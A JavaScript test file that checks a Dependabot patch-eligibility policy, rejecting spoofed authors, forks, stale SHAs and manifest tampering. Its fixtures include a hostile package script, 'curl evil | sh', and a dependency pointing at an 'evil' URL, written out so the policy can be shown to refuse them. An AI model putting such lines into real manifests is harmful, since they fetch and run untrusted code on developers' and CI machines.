import assert from 'node:assert/strict';
import test from 'node:test';
import { eligiblePatch } from './policy.mjs';

const pr = {
  user: { login: 'dependabot[bot]', id: 49699333, type: 'Bot' },
  state: 'open',
  draft: false,
  base: { ref: 'main', repo: { full_name: 'pbuchman/fishing-assistant' } },
  head: { sha: 'a'.repeat(40), repo: { full_name: 'pbuchman/fishing-assistant' } },
};
const input = {
  pr,
  repository: 'pbuchman/fishing-assistant',
  expectedSha: pr.head.sha,
  updateType: 'version-update:semver-patch',
  dependencyNames: 'fastify',
  files: [
    { filename: 'package.json', status: 'modified' },
    { filename: 'pnpm-lock.yaml', status: 'modified' },
  ],
};

test('accepts authentic same-repo Dependabot patch manifests and lock', () => {
  assert.equal(eligiblePatch(input), true);
});
/** @type {[string, Record<string, unknown>][]} */
const rejected = [
  ['minor', { updateType: 'version-update:semver-minor' }],
  ['major', { updateType: 'version-update:semver-major' }],
  ['missing metadata', { dependencyNames: '' }],
  ['workflow', { files: [{ filename: '.github/workflows/ci.yml', status: 'modified' }] }],
  ['source', { files: [{ filename: 'apps/web/src/main.tsx', status: 'modified' }] }],
  ['unknown manifest', { files: [{ filename: 'scripts/package.json', status: 'modified' }] }],
  ['rename', { files: [{ filename: 'package.json', status: 'renamed' }] }],
  ['empty diff', { files: [] }],
  ['stale SHA', { expectedSha: 'b'.repeat(40) }],
  ['spoofed author', { pr: { ...pr, user: { ...pr.user, id: 12 } } }],
  ['fork', { pr: { ...pr, head: { ...pr.head, repo: { full_name: 'evil/fishing-assistant' } } } }],
  ['draft', { pr: { ...pr, draft: true } }],
  ['closed', { pr: { ...pr, state: 'closed' } }],
  ['other base', { pr: { ...pr, base: { ...pr.base, ref: 'other' } } }],
];
for (const [name, changes] of rejected)
  test(`rejects ${name}`, () => assert.equal(eligiblePatch({ ...input, ...changes }), false));

test('rejects manifest scripts and nonpatch edits even with patch metadata', async () => {
  const { manifestPatchOnly } = await import('./policy.mjs');
  const a = { scripts: { test: 'vitest' }, dependencies: { fastify: '^5.1.0' } };
  assert.equal(manifestPatchOnly(a, { ...a, dependencies: { fastify: '^5.1.1' } }), true);
  assert.equal(manifestPatchOnly(a, { ...a, scripts: { test: 'curl evil | sh' } }), false);
  assert.equal(manifestPatchOnly(a, { ...a, dependencies: { fastify: '^5.2.0' } }), false);
  assert.equal(manifestPatchOnly(a, { ...a, dependencies: { fastify: '^6.1.1' } }), false);
  assert.equal(
    manifestPatchOnly(a, { ...a, dependencies: { fastify: 'https://evil/pkg' } }),
    false
  );
  assert.equal(
    manifestPatchOnly(a, { ...a, dependencies: { fastify: '^5.1.1', malicious: '1.0.0' } }),
    false
  );
  assert.equal(manifestPatchOnly(a, { ...a, pnpm: { overrides: { fastify: '1.0.0' } } }), false);
});
